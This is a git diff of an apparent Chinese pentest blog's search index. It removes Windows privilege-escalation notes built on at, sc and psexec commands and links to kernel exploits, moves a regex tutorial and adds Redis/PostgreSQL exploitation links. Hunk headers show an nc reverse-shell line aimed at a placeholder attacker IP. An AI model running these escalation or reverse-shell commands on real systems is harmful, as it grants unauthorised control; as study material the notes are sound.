-    <url>/2022/03/01/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%8F%8AAT&amp;SC&amp;PS%E6%8F%90%E6%9D%83/</url>
-    <content><![CDATA[<p><img src="/2022/03/01/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%8F%8AAT&SC&PS%E6%8F%90%E6%9D%83/image-20220228235230607.png" alt="image-20220228235230607"></p>
-<h2 id="知识必备点"><a href="#知识必备点" class="headerlink" title="知识必备点"></a>知识必备点</h2><p>用户及用户组权限划分</p>
-<p><img src="/2022/03/01/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%8F%8AAT&SC&PS%E6%8F%90%E6%9D%83/image-20220228235812582.png" alt="image-20220228235812582"></p>
-<p>Windows提权命令</p>
-<p><img src="/2022/03/01/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%8F%8AAT&SC&PS%E6%8F%90%E6%9D%83/image-20220228235539073.png" alt="image-20220228235539073"></p>
-<h2 id="如何判断哪种溢出漏洞，漏洞哪里找"><a href="#如何判断哪种溢出漏洞，漏洞哪里找" class="headerlink" title="如何判断哪种溢出漏洞，漏洞哪里找"></a>如何判断哪种溢出漏洞，漏洞哪里找</h2><p>流程：信息搜集-&gt;补丁筛选-&gt;利用msf或特定exp执行-&gt;提权成功</p>
-<h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>一开始使用systeminfo查看当前系统信息，获取补丁编号</p>
-<h3 id="补丁筛选"><a href="#补丁筛选" class="headerlink" title="补丁筛选"></a>补丁筛选</h3><p>vulmap，Wes，WindowsVulnScan工具（后两个好用）</p>
-<p>对于vulmap来说，web很难能执行.ps1文件，所以webshell实用性不佳</p>
-<p>Wes和WindowsVulnScan，本质是比较windows系统版本、systeminfo补丁信息来查看漏洞利用情况。</p>
-<p>这里注意WindowsVulnScan， 也需要执行一个.sp1的文件，但这个文件其实也就是和systeminfo做的相同的工作，只是生成了一个KB.json文件，我们可以自行在webshell里执行systeminfo然后改成和KB.json里一样的格式，然后在本机用该工具对改好的KB.json扫描，若扫描时报错可能是KB.json文件编码有问题，需要改成UTF-8</p>
-<p><a href="https://www.cnblogs.com/bonelee/p/15863223.html">WindowsVulnScan和Wes用法</a></p>
-<p>wes检测语句：python wes.py systeminfo.txt -o vuln.csv</p>
-<p>根据vuln.csv中获取exp链接地址</p>
-<h2 id="AT-amp-SC-amp-PS提权"><a href="#AT-amp-SC-amp-PS提权" class="headerlink" title="AT&amp;SC&amp;PS提权"></a>AT&amp;SC&amp;PS提权</h2><h3 id="at提权"><a href="#at提权" class="headerlink" title="at提权"></a>at提权</h3><p>适用版本：Win2000 &amp; Win2003 &amp; XP中还是存在的，在Win7以后被剔除</p>
-<p>payload：<code>at (时间) /interactive cmd.exe</code></p>
-<p><img src="/2022/03/01/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%8F%8AAT&SC&PS%E6%8F%90%E6%9D%83/image-20220301235011222.png" alt="image-20220301235011222"></p>
-<h3 id="sc提权"><a href="#sc提权" class="headerlink" title="sc提权"></a>sc提权</h3><p>win2003测试成功,win7未测试成功</p>
-<p>创建一个名叫syscmd的新的交互式的cmd执行服务</p>
-<p><code>sc Create syscmdd binPath= &quot;cmd /K start&quot; type= own type= interact</code></p>
-<p>运行服务</p>
-<p><code>sc start syscmdd</code></p>
-<p><img src="/2022/03/01/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%8F%8AAT&SC&PS%E6%8F%90%E6%9D%83/image-20220301235056001.png" alt="image-20220301235056001"></p>
-<h3 id="PS提权"><a href="#PS提权" class="headerlink" title="PS提权"></a>PS提权</h3><p>适用版本：<code>Win2003 &amp; Win2008</code></p>
-<p>需要下载PsTools（windows官方软件不会被杀）</p>
-<p>payload：<code>psexec.exe -accepteula -s -i -d cmd.exe</code></p>
-<h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><p><a href="https://github.com/vulmon/Vulmap">https://github.com/vulmon/Vulmap</a></p>
-<p><a href="https://github.com/bitsadmin/wesng">https://github.com/bitsadmin/wesng</a></p>
-<p><a href="https://github.com/chroblert/WindowsVulnScan">https://github.com/chroblert/WindowsVulnScan</a></p>
-<p>win内核漏洞exp收录：<a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></p>
-<p><a href="https://www.shuzhiduo.com/A/A7zgDNYKJ4/">云服务器上安装msf以及msf初体验</a></p>
-<p><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools">https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools</a></p>
-<p><a href="https://github.com/unamer/CVE-2018-8120">https://github.com/unamer/CVE-2018-8120</a></p>
-<p><a href="https://github.com/cbwang505/CVE-2020-0787-EXP-ALL-WINDOWs-VERSION/releases/tag/1">CVE-2020-0787-EXP-ALL-WINDOWS-VERSION</a></p>
-]]></content>
-      <categories>
-        <category>权限提升</category>
-      </categories>
-      <tags>
-        <tag>渗透测试</tag>
-        <tag>提权</tag>
-        <tag>win</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>烂土豆&amp;dll劫持&amp;引号路径&amp;服务权限</title>
     <url>/2022/03/04/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%83%82%E5%9C%9F%E8%B1%86&amp;dll%E5%8A%AB%E6%8C%81&amp;%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84&amp;%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/</url>
     <content><![CDATA[<h2 id="烂土豆配合令牌窃取"><a href="#烂土豆配合令牌窃取" class="headerlink" title="烂土豆配合令牌窃取"></a>烂土豆配合令牌窃取</h2><p>原理</p>
@@ -3424,6 +3414,83 @@ nc 攻击机IP 1234 -e c:\windows\system32\cmd.exe
         <tag>渗透测试</tag>
         <tag>提权</tag>
         <tag>win提权</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>正则表达式</title>
+    <url>/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
+    <content><![CDATA[<blockquote>
+<p>正则在线测试网站：<a href="https://regexr-cn.com/">https://regexr-cn.com</a></p>
+<p>正则练习平台：<a href="https://www.codejiaonang.com/#/course/regex_chapter1/0/0">https://www.codejiaonang.com/#/course/regex_chapter1/0/0</a></p>
+</blockquote>
+<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220124154750051.png" alt="image-20220124154750051"></p>
+<h3 id="字符集：匹配集合中的任何字符"><a href="#字符集：匹配集合中的任何字符" class="headerlink" title="[]字符集：匹配集合中的任何字符"></a><code>[]</code>字符集：匹配集合中的任何字符</h3><ul>
+<li><p><code>-</code>表示区间，例如：<code>[a-z]</code>表示小写字母a到z</p>
+</li>
+<li><p><code>\</code>转义特殊字符，<code>[\]]</code>表示匹配<code>]</code></p>
+</li>
+<li><p><code>^</code>表示取非，<code>[^]</code>称作非集，匹配不在集合中的任何字符，例如<code>我[^你]</code>匹配我字后面没有你字（匹配两个字）</p>
+</li>
+</ul>
+<h3 id="快捷方式"><a href="#快捷方式" class="headerlink" title="快捷方式"></a>快捷方式</h3><p><code>\d</code>数字，匹配任意数字(0-9)</p>
+<p><code>\w</code>单词，匹配字母、数字、下划线</p>
+<p><code>\s</code>空白字符，匹配任何空白字符。(空格，制表符tab，换行符)</p>
+<p><code>\b</code>词边界，匹配一个单词边界，也就是指单词和空格见的位置，成对使用，例如<code>\bawesome\b</code>，匹配完整的单词，前后不能有其他字母，否则将匹配失败</p>
+<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220125125138035.png" alt="image-20220125125138035"></p>
+<p>快捷方式取非，将上述<code>dwsb</code>等字母，换成大写即可</p>
+<h3 id="开头和结尾"><a href="#开头和结尾" class="headerlink" title="开头和结尾"></a>开头和结尾</h3><p><code>^</code>开头，匹配字符串开头，或者当使用多行标志时，匹配一行的开头</p>
+<p><code>$</code>结尾，匹配字符串结尾，或者当使用多行标志时，匹配一行的结尾</p>
+<p>例如<code>^abcd</code>会匹配<code>abcdefg</code>中的<code>abcd</code>，<code>efg$</code>会匹配<code>abcdefg</code>中的<code>efg</code></p>
+<h3 id="任意字符"><a href="#任意字符" class="headerlink" title="任意字符"></a>任意字符</h3><p><code>.</code>，匹配任何字符(不包括换行)</p>
+<h3 id="量词"><a href="#量词" class="headerlink" title="量词"></a>量词</h3><p><code>?</code>，匹配在0和1之间个前面的标记，例如<code>favou?r</code>，匹配的时favour和favor</p>
+<p><code>&#123;n&#125;</code>，匹配n个前面的标记，例如<code>\d&#123;10&#125;</code>，匹配连续10个数字</p>
+<p><code>&#123;n,m&#125;</code><strong>贪婪模式</strong>，匹配n到m个前面的标记，有连续的m个就会匹配m个</p>
+<p><code>&#123;n,m&#125;?</code><strong>非贪婪模式</strong>，只会匹配到连续的n个就停止匹配，例如下图</p>
+<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220124234228787.png" alt="image-20220124234228787"></p>
+<p><code>*</code>，匹配0个或更多个前面的标记，例如<code>f.*</code>，会匹配所有f开头的字符</p>
+<p><code>+</code>，匹配1个或更多个前面的标记，例如<code>f.+</code>，会匹配所有f开头的字符，但不匹配单独的f</p>
+<h3 id="分组提取"><a href="#分组提取" class="headerlink" title="分组提取"></a>分组提取</h3><p><code>()</code>捕获分组，把多个标记分在同一组并创建一个捕获分组，用来创建子串或引用</p>
+<p><code>|</code>或者条件</p>
+<p><code>(?:表达式)</code>非捕获分组，在不创建捕获分组的情况下，把数个标记组在一起</p>
+<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220125164458925.png" alt="image-20220125164458925"></p>
+<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220125173535988.png" alt="image-20220125173535988"></p>
+<p><code>(表达式)\1</code>分组的回溯引用，<code>\1</code>的效果是重新使用第1个分组去匹配，例如<code>(\w)(\w)\2\1</code>，匹配abba这种类型的字符，<strong>注：只有<code>()</code>有效，<code>(?:)</code>等无效</strong></p>
+<h3 id="断言"><a href="#断言" class="headerlink" title="断言"></a>断言</h3><p>可以理解为预搜索，可对字符串做限制要求</p>
+<h4 id="先行（表示从某个位置向右看）"><a href="#先行（表示从某个位置向右看）" class="headerlink" title="先行（表示从某个位置向右看）"></a>先行（表示从某个位置向右看）</h4><p><code>(?=)</code><strong>正向</strong>先行断言，匹配主表达式后面的组而不将其包含在结果中（保证右边含有某字符）</p>
+<p><strong>可以翻译为：(?=表达式)右边存在</strong></p>
+<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220125175109411.png" alt="image-20220125175109411"></p>
+<p><code>(?!)</code><strong>反向</strong>先行断言,指定著表达式后无法匹配的组，若匹配结果将被丢弃（保证右边不出现某字符）</p>
+<p><strong>可以翻译为：(?!表达式)右边不存在</strong></p>
+<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220125181138445.png" alt="image-20220125181138445"></p>
+<p>tips：正向是<code>=</code>，反向是<code>!</code>，也即正向是<strong>有</strong>，反向是<strong>没有</strong></p>
+<h4 id="后行-表示从某个位置向左看"><a href="#后行-表示从某个位置向左看" class="headerlink" title="后行(表示从某个位置向左看)"></a>后行(表示从某个位置向左看)</h4><p><code>(?&lt;=)</code><strong>正向</strong>后行断言，匹配主表达式之前的组，而不将其包含在结果中</p>
+<p><strong>可以翻译为：(?&lt;=表达式)左边存在</strong></p>
+<p><code>(?&lt;!)</code><strong>反向</strong>后行断言，指定在主表达式之前无法匹配的组，如果匹配，则结果将被丢弃</p>
+<p><strong>可以翻译为：(?&lt;!表达式)左边不存在</strong></p>
+<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220125181836600.png" alt="image-20220125181836600"></p>
+<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220125183732972.png" alt="image-20220125183732972"></p>
+]]></content>
+      <tags>
+        <tag>正则表达式</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Redis&amp;Postgre</title>
+    <url>/2022/03/03/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Redis&amp;Postgre/</url>
+    <content><![CDATA[<p><img src="/2022/03/03/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Redis&Postgre/image-20220303221213861.png" alt="image-20220303221213861"></p>
+<p><img src="/2022/03/03/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Redis&Postgre/image-20220303232856998.png" alt="image-20220303232856998"></p>
+<p><a href="https://www.jianshu.com/p/fd7b422d5f93">简述关系型数据库和非关系型数据库</a></p>
+<p><a href="https://blog.csdn.net/fly_hps/article/details/80937837">Redis未授权访问漏洞利用总结</a></p>
+<p><a href="https://vulhub.org/#/environments/postgres/CVE-2018-1058/">https://vulhub.org/#/environments/postgres/CVE-2018-1058/</a></p>
+<p><a href="https://vulhub.org/#/environments/postgres/CVE-2019-9193/">https://vulhub.org/#/environments/postgres/CVE-2019-9193/</a></p>
+]]></content>
+      <categories>
+        <category>权限提升</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+        <tag>提权</tag>
+        <tag>数据库提权</tag>
       </tags>
   </entry>
   <entry>
@@ -3517,64 +3584,6 @@ nc 攻击机IP 1234 -e c:\windows\system32\cmd.exe
       </categories>
       <tags>
         <tag>社会工程学，钓鱼</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>正则表达式</title>
-    <url>/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
-    <content><![CDATA[<blockquote>
-<p>正则在线测试网站：<a href="https://regexr-cn.com/">https://regexr-cn.com</a></p>
-<p>正则练习平台：<a href="https://www.codejiaonang.com/#/course/regex_chapter1/0/0">https://www.codejiaonang.com/#/course/regex_chapter1/0/0</a></p>
-</blockquote>
-<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220124154750051.png" alt="image-20220124154750051"></p>
-<h3 id="字符集：匹配集合中的任何字符"><a href="#字符集：匹配集合中的任何字符" class="headerlink" title="[]字符集：匹配集合中的任何字符"></a><code>[]</code>字符集：匹配集合中的任何字符</h3><ul>
-<li><p><code>-</code>表示区间，例如：<code>[a-z]</code>表示小写字母a到z</p>
-</li>
-<li><p><code>\</code>转义特殊字符，<code>[\]]</code>表示匹配<code>]</code></p>
-</li>
-<li><p><code>^</code>表示取非，<code>[^]</code>称作非集，匹配不在集合中的任何字符，例如<code>我[^你]</code>匹配我字后面没有你字（匹配两个字）</p>
-</li>
-</ul>
-<h3 id="快捷方式"><a href="#快捷方式" class="headerlink" title="快捷方式"></a>快捷方式</h3><p><code>\d</code>数字，匹配任意数字(0-9)</p>
-<p><code>\w</code>单词，匹配字母、数字、下划线</p>
-<p><code>\s</code>空白字符，匹配任何空白字符。(空格，制表符tab，换行符)</p>
-<p><code>\b</code>词边界，匹配一个单词边界，也就是指单词和空格见的位置，成对使用，例如<code>\bawesome\b</code>，匹配完整的单词，前后不能有其他字母，否则将匹配失败</p>
-<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220125125138035.png" alt="image-20220125125138035"></p>
-<p>快捷方式取非，将上述<code>dwsb</code>等字母，换成大写即可</p>
-<h3 id="开头和结尾"><a href="#开头和结尾" class="headerlink" title="开头和结尾"></a>开头和结尾</h3><p><code>^</code>开头，匹配字符串开头，或者当使用多行标志时，匹配一行的开头</p>
-<p><code>$</code>结尾，匹配字符串结尾，或者当使用多行标志时，匹配一行的结尾</p>
-<p>例如<code>^abcd</code>会匹配<code>abcdefg</code>中的<code>abcd</code>，<code>efg$</code>会匹配<code>abcdefg</code>中的<code>efg</code></p>
-<h3 id="任意字符"><a href="#任意字符" class="headerlink" title="任意字符"></a>任意字符</h3><p><code>.</code>，匹配任何字符(不包括换行)</p>
-<h3 id="量词"><a href="#量词" class="headerlink" title="量词"></a>量词</h3><p><code>?</code>，匹配在0和1之间个前面的标记，例如<code>favou?r</code>，匹配的时favour和favor</p>
-<p><code>&#123;n&#125;</code>，匹配n个前面的标记，例如<code>\d&#123;10&#125;</code>，匹配连续10个数字</p>
-<p><code>&#123;n,m&#125;</code><strong>贪婪模式</strong>，匹配n到m个前面的标记，有连续的m个就会匹配m个</p>
-<p><code>&#123;n,m&#125;?</code><strong>非贪婪模式</strong>，只会匹配到连续的n个就停止匹配，例如下图</p>
-<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220124234228787.png" alt="image-20220124234228787"></p>
-<p><code>*</code>，匹配0个或更多个前面的标记，例如<code>f.*</code>，会匹配所有f开头的字符</p>
-<p><code>+</code>，匹配1个或更多个前面的标记，例如<code>f.+</code>，会匹配所有f开头的字符，但不匹配单独的f</p>
-<h3 id="分组提取"><a href="#分组提取" class="headerlink" title="分组提取"></a>分组提取</h3><p><code>()</code>捕获分组，把多个标记分在同一组并创建一个捕获分组，用来创建子串或引用</p>
-<p><code>|</code>或者条件</p>
-<p><code>(?:表达式)</code>非捕获分组，在不创建捕获分组的情况下，把数个标记组在一起</p>
-<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220125164458925.png" alt="image-20220125164458925"></p>
-<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220125173535988.png" alt="image-20220125173535988"></p>
-<p><code>(表达式)\1</code>分组的回溯引用，<code>\1</code>的效果是重新使用第1个分组去匹配，例如<code>(\w)(\w)\2\1</code>，匹配abba这种类型的字符，<strong>注：只有<code>()</code>有效，<code>(?:)</code>等无效</strong></p>
-<h3 id="断言"><a href="#断言" class="headerlink" title="断言"></a>断言</h3><p>可以理解为预搜索，可对字符串做限制要求</p>
-<h4 id="先行（表示从某个位置向右看）"><a href="#先行（表示从某个位置向右看）" class="headerlink" title="先行（表示从某个位置向右看）"></a>先行（表示从某个位置向右看）</h4><p><code>(?=)</code><strong>正向</strong>先行断言，匹配主表达式后面的组而不将其包含在结果中（保证右边含有某字符）</p>
-<p><strong>可以翻译为：(?=表达式)右边存在</strong></p>
-<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220125175109411.png" alt="image-20220125175109411"></p>
-<p><code>(?!)</code><strong>反向</strong>先行断言,指定著表达式后无法匹配的组，若匹配结果将被丢弃（保证右边不出现某字符）</p>
-<p><strong>可以翻译为：(?!表达式)右边不存在</strong></p>
-<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220125181138445.png" alt="image-20220125181138445"></p>
-<p>tips：正向是<code>=</code>，反向是<code>!</code>，也即正向是<strong>有</strong>，反向是<strong>没有</strong></p>
-<h4 id="后行-表示从某个位置向左看"><a href="#后行-表示从某个位置向左看" class="headerlink" title="后行(表示从某个位置向左看)"></a>后行(表示从某个位置向左看)</h4><p><code>(?&lt;=)</code><strong>正向</strong>后行断言，匹配主表达式之前的组，而不将其包含在结果中</p>
-<p><strong>可以翻译为：(?&lt;=表达式)左边存在</strong></p>
-<p><code>(?&lt;!)</code><strong>反向</strong>后行断言，指定在主表达式之前无法匹配的组，如果匹配，则结果将被丢弃</p>
-<p><strong>可以翻译为：(?&lt;!表达式)左边不存在</strong></p>
-<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220125181836600.png" alt="image-20220125181836600"></p>
-<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220125183732972.png" alt="image-20220125183732972"></p>
-]]></content>
-      <tags>
-        <tag>正则表达式</tag>
       </tags>
   </entry>
 </search>
